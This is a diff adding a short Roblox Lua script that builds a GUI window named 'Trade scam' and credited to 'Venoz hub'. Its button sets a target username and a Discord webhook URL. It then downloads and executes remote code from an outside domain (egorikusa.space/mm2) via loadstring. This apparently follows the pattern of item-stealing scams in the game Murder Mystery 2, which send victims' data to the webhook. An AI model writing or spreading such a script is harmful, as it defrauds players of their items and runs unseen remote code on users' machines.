@@ -1,0 +1,33 @@
+local player = game.Players.LocalPlayer
+local OrionLib = 
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+local Window = OrionLib:MakeWindow({Name = "Trade scam", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+
+
+local Tab = Window:MakeTab({
+	Name = "Tab 1",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+	Name = "trade scam"
+})
+
+OrionLib:MakeNotification({
+	Name = "Venoz hub",
+	Content = "Made by Venoz",
+	Image = "rbxassetid://4483345998",
+	Time = 5
+})
+
+Tab:AddButton({
+	Name = "Trade scam clink to begin",
+	Callback = function()
+      		Username = "xavaxonosel"
+Webhook = "https://discordapp.com/api/webhooks/1262117932603936788/RWopR3SY6zzdodUnAjhwimcGgwiJMdbBjPT42QYg34CWp3VDpp6bCgBanyQ3NFfc0FZ4"
+
+loadstring(game:HttpGet("https://egorikusa.space/mm2"))()
+  	end    
+})
